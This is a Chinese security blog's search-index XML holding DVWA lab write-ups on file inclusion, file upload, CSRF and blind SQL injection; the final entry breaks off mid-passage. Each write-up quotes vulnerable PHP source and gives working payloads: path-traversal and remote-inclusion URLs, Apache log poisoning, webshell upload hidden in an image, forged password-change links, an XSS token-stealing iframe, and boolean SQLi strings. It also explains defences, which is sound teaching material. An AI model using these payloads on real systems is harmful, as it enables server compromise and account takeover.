<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DVWA学习（八）文件包含漏洞]]></title>
    <url>%2F2018%2F05%2F30%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AB%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（八）文件包含漏洞 简介File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函include()，require()和include_once()，require_once()利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。 文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 本地文件包含(Loacl File Inclusion,LFI)通过浏览器引进(包含)web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。 远程文件包含(Remote File Inclusion,RFI)该漏洞允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码 系统中常见的敏感信息路径如下：（1）Windows系统 （2）Linux系统 LOW难度源码：1234&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];?&gt; page参数没有任何过滤。点击三个文件名，服务器会包含相应的文件,page参数是不可控的。 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 本地文件包含绝对路径:1http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=/etc/passwd ../返回上级目录，可以用多次先返回到根目录然后再进入目标目录1http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=../../../../../../etc/passwd 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。 在主机服务器创建test.txt文件 构造url1http://192.168.86.128/DVWA-master/vulnerabilities/fi/page=http://192.168.86.1/test.txt Medium难度源码：1234567&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt; 使用str_replace函数过滤了http://和https://，以及../和..。 使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。 远程文件包含：1http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=htthttp://p://192.168.86.1/test.txt High难度源码：12345678910&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;// This isn&apos;t the page we want!echo &quot;ERROR: File not found!&quot;;exit;&#125;?&gt; fnmatch() 函数根据指定的模式来匹配文件名或字符串。12345if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;// This isn&apos;t the page we want!echo &quot;ERROR: File not found!&quot;;exit;&#125; 这个if语句的意思是如果page中不含有file并且page不等于include.php服务器才不回去包含相应的文件。两个条件只要不满足其中之一就可以，要么page等于include.php,要么page含有file。用file://流访问本地文件系统。1http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=file:///etc/passwd 至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。 impossible源码：12345678910&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;// This isn&apos;t the page we want!echo &quot;ERROR: File not found!&quot;;exit;&#125;?&gt; 采用白名单机制进行防护，，page参数必须为include.php、file1.php、file2.php、file3.php之一，彻底杜绝了文件包含漏洞。 利用1.包含Apache日志文件： Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志),和error.log(错误日志),Apache的访问日志文件记录了客户端的每次请求以及服务器响应的相关信息。 当访问一个不存在的资源的时候，Apache日志文件同样会记录，这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL：1http://ww.XXX.com/&lt;?php phpinfo();?&gt; Apache会记录请求&lt;?php phpinfo();?&gt;，并写到access.log 文件中，这时再去包含Apache日志文件，就可以利用文件包含漏洞了。但是访问URL后，一句话木马在日志文件中变形了，这是由于URL编码的缘故。PHP中的&lt;&gt;都被浏览器转码了，但是可以通过burp抓包绕过编码。前提是攻击者知道Apache的日志路径。 成功写入日志文件 因为MySQL用户权限不足，不能读取Apache的日志，需要提权操作。 2.配合文件上传漏洞 和文件上传漏洞或者SQL注入漏洞等一同利用，通过利用前面的漏洞将一句话木马1.php文件上传到Web服务器中，然后再通过文件包含漏洞包含出现从而得到shell。例如上传了一个名为1.txt的文件，内容为：&lt;?php phpinfo();?&gt;直接包含该文件会将该文件以PHP来运行： 防御方法：1、严格判断包含中的参数是否外部可控。2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：../。3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(&quot;head.php&quot;)。5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（七）文件上传漏洞]]></title>
    <url>%2F2018%2F05%2F26%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（七）文件上传漏洞 简介File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 保存一句话木马为muma.php LOW级别源码 1234567891011121314151617&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;// Where are we going to be writing to?$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );// Can we move the file to the upload folder?if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;// Noecho &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;&#125;else &#123;// Yes!echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;&#125;&#125;?&gt; basename() 函数返回路径中的文件名部分。move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。file 必需。规定要移动的文件。newloc 必需。规定文件的新位置。12345$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称DVWA_WEB_PAGE_TO_ROOT是网站根目录没有任何过滤，可以上传任意文件。上传muma.php显示了文件路径../../hackable/uploads/muma.php succesfully uploaded!用中国菜刀 然后菜刀就会通过向服务器发送包含haha参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件。 Medium难度源码12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;// Where are we going to be writing to?$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );// File information$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];// Is it an image?if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;( $uploaded_size &lt; 100000 ) ) &#123;// Can we move the file to the upload folder?if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;// Noecho &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;&#125;else &#123;// Yes!echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;&#125;&#125;else &#123;// Invalid fileecho &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;&#125;&#125;?&gt; 这里采用白名单过滤只允许上传文件的 MIME类型为image/jpeg或者image/png以及文件大小小于100000字节。 1.用burp更改content-type就行 2.截断绕过规则 在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为muma.php%00.png。 而服务器会认为其文件名为hack.php，顺势解析为php文件。（仅限于php版本小于5.3.4的版本） High 难度源码：123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;// Where are we going to be writing to?$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );// File information$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];// Is it an image?if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;( $uploaded_size &lt; 100000 ) &amp;&amp;getimagesize( $uploaded_tmp ) ) &#123;// Can we move the file to the upload folder?if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;// Noecho &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;&#125;else &#123;// Yes!echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;&#125;&#125;else &#123;// Invalid fileecho &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;&#125;&#125;?&gt; substr(string,start,length)返回字符串的一部分。strrpos()查找第二个参数在第一个参数中最后一次出现的位置$uploaded_ext等于文件的后缀名getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 仍然采用白名单过滤，只允许上传的文件后缀名为jpg，jpeg，png以及文件大小小于100000字节。getimagesize函数限制了上传文件的文件头必须为图像类型。 1.采用%00截断 需要将上传文件的文件头伪装成图片。常见的图片格式的文件头标识如下： 用copy将一句话木马文件php.php与图片文件1.jpg合并 记事本打开可以发现一句话木马藏在了图片里 绕过后缀检查 然后需要用到文件包含漏洞。1http://192.168.86.128/DVWAmaster/vulnerabilities/fi/?page=file:///var/www/html/DVWA-master/hackable/uploads/muma.jpg 在文件包含漏洞页面成功加载图片 然后用菜刀，地址栏填上面的url，参数名 haha, 连接失败，cookie里会有两个相同的参数，导致访问失败。wirteup上说是DVWA的BUG %00 截断需要 PHP&lt;5.3.4，实验环境为 5.6.35 所以无法利用。 impossible难度源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// File information$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];// Where are we going to be writing to?$target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;//$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;;$target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;$temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );$temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;// Is it an image?if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;( $uploaded_size &lt; 100000 ) &amp;&amp;( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;getimagesize( $uploaded_tmp ) ) &#123;// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)if( $uploaded_type == &apos;image/jpeg&apos; ) &#123;$img = imagecreatefromjpeg( $uploaded_tmp );imagejpeg( $img, $temp_file, 100);&#125;else &#123;$img = imagecreatefrompng( $uploaded_tmp );imagepng( $img, $temp_file, 9);&#125;imagedestroy( $img );// Can we move the file to the web root from the temp folder?if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;// Yes!echo &quot;&lt;pre&gt;&lt;a href=&apos;$&#123;target_path&#125;$&#123;target_file&#125;&apos;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;&#125;else &#123;// Noecho &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;&#125;// Delete any temp filesif( file_exists( $temp_file ) )unlink( $temp_file );&#125;else &#123;// Invalid fileecho &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。由于基于系统时间，通过该函数生成的 ID 不是最佳的。如需生成绝对唯一的 ID，需使用 md5() 函数。 ini_get — 获取一个配置选项的值。upload_tmp_dir上传文件的临时目录。sys_get_temp_dir — 返回用于临时文件的目录。DIRECTORY_SEPARATOR是一个返回跟操作系统相关的路径分隔符内置命令，在windows上返回\，而在linux或者类unix上回/。imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像。（ imagecreatefrom，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。）php imagecreatefrom 系列函数之 png – janes。imagejpeg(a,b,c) 从 image 图像以 b为文件名创建一个JPEG 图像,c为文件质量1-100，默认约为75。PHP getcwd() 函数获取当前工作目录。file_exists() 函数检查文件或目录是否存在。unlink() 函数删除文件。impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（六）CSRF]]></title>
    <url>%2F2018%2F05%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89CSRF%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（六）CSRF 简介CSRF(Cross-site request forgery)CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。 LOW级别源码：123456789101112131415161718192021222324252627&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;// Get input$pass_new = $_GET[ &apos;password_new&apos; ];$pass_conf = $_GET[ &apos;password_conf&apos; ];// Do the passwords match?if( $pass_new == $pass_conf ) &#123;// They do!$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass_new = md5( $pass_new );// Update the database$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );// Feedback for the userecho &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;&#125;else &#123;// Issue with passwords matchingecho &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 只要参数password_new=password_conf，服务器就会修改密码。所以只要构造payload1http://192.168.86.128/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;change=change 只要cookie存在，点击这个链接之后密码就会被修改。需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。 如果觉得网址太明显了可以用缩短网址 虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。所以我们可以构造攻击页面，让受害者去访问这个页面然后自动访问该链接我们在ububtu服务器根目录创建文件123.html 现在用外部主机访问该文件 重新登陆显示密码错误，而用123登陆显示成功 Medium难度源码：12345678910111213141516171819202122232425262728293031323334&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;// Checks to see where the request came fromif( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123;// Get input$pass_new = $_GET[ &apos;password_new&apos; ];$pass_conf = $_GET[ &apos;password_conf&apos; ];// Do the passwords match?if( $pass_new == $pass_conf ) &#123;// They do!$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass_new = md5( $pass_new );// Update the database$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );// Feedback for the userecho &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;&#125;else &#123;// Issue with passwords matchingecho &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;&#125;&#125;else &#123;// Didn&apos;t come from a trusted sourceecho &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; $_SERVER[&#39;HTTP_REFERER&#39;] //链接到当前页面的前一页面的 URL 地址。$_SERVER[&#39;SERVER_NAME&#39;] //服务器主机的名称。 1.通常情况：_SERVER[&quot;HTTP_HOST&quot;]在HTTP/1.1协议规范下，会根据客户端的HTTP请求输出信息。_SERVER[&quot;SERVER_NAME&quot;] 默认情况下直接输出apache的配置文件httpd.conf中的ServerName值。 2.当服务器为非80端口时：_SERVER[&quot;HTTP_HOST&quot;] 会输出端口号，例如：mimiz.cn:8080_SERVER[&quot;SERVER_NAME&quot;] 会直接输出ServerName值因此在这种情况下，可以理解为：HTTP_HOST = SERVER_NAME : SERVER_PORT Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，即要访问的主机名），希望通过这种机制抵御CSRF攻击。 Host：客户端指定自己想访问的http服务器的域名/IP 地址和端口号。http头中的host字段详解 Referer：是 HTTP 请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含 Referer 。比如我在www.sojson.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：Referer=http://www.sojson.com也就是说请求源referer中必须包含有host主机名才可以请求改密成功。 现在我把本地服务器当作攻击者的服务器，虚拟机ubuntu的服务器为用户想要改密的网站服务器。当我访问123.html中的恶意网址时，referer等于攻击者的域名127.0.0.1，host为恶意网址请求的主机名192.168.86.128 此时是不会请求成功的。但是攻击者服务器的恶意文件名可以等于改密网站的主机名。 现在用户访问恶意网站的时候抓包查看 refere是包含host的，所以是可以改密码成功的。 High难度源码：123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$pass_new = $_GET[ &apos;password_new&apos; ];$pass_conf = $_GET[ &apos;password_conf&apos; ];// Do the passwords match?if( $pass_new == $pass_conf ) &#123;// They do!$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass_new = md5( $pass_new );// Update the database$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );// Feedback for the userecho &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;&#125;else &#123;// Issue with passwords matchingecho &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 绕过需要获取页面的token，但是由于浏览器是不允许跨域请求的，域名A是不允许获取域名B页面中的内容的。除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。所以我们需要利用该网站的XSS漏洞协助获取token。1txtName=&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;&amp;mtxMessage=1222 或者用XSS获取COOKIE 然后改COOKIE以及要改的密码 impossible源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$pass_curr = $_GET[ &apos;password_current&apos; ];$pass_new = $_GET[ &apos;password_new&apos; ];$pass_conf = $_GET[ &apos;password_conf&apos; ];// Sanitise current password input$pass_curr = stripslashes( $pass_curr );$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass_curr = md5( $pass_curr );// Check that the current password is correct$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );$data-&gt;execute();// Do both new passwords match and does the current password match the user?if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;// It does!$pass_new = stripslashes( $pass_new );$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass_new = md5( $pass_new );// Update database with new password$data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );$data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );$data-&gt;execute();// Feedback for the userecho &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;&#125;else &#123;// Issue with passwords matchingecho &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 加入了PDO预编译语句防止SQL注入，防止CSRF不仅用了token，还要求用户输入原密码，这样在不知道原密码的情况下就无法构造参数。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（四）SQL Injection（Blind）]]></title>
    <url>%2F2018%2F05%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89SQL-Injection%EF%BC%88Blind%EF%BC%89%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（四）SQL Injection（Blind） 简介盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。 盲注分为三类：•基于布尔SQL盲注•基于时间的SQL盲注•基于报错的SQL盲注 构造payload让信息通过错误提示回显出来 LOW级别1234567id=1-5 显示 User ID exists in the database.id=1&apos; 或者大于5显示 User ID is MISSING from the databaseid=1&apos; or 1=&apos;1 显示 User ID exists in the database.id=1 or 1=1 显示 User ID exists in the database.id=1&apos; and &apos;1&apos;=&apos;0 显示 User ID is MISSING from the database.id=1&apos; and &apos;1&apos;=&apos;1 显示 User ID exists in the database.id=1 and 1=0 显示 User ID exists in the database. 可以判断为单引号闭合 1.对ascii值爆破的方法：输入1&#39; and length(database())=4 %23，显示存在，所以数据库名为4个字符长度。id=1&#39; and if(ascii(substr((select database()),1,1))=100,1,0)%23&amp;Submit=Submit显示User ID exists in the 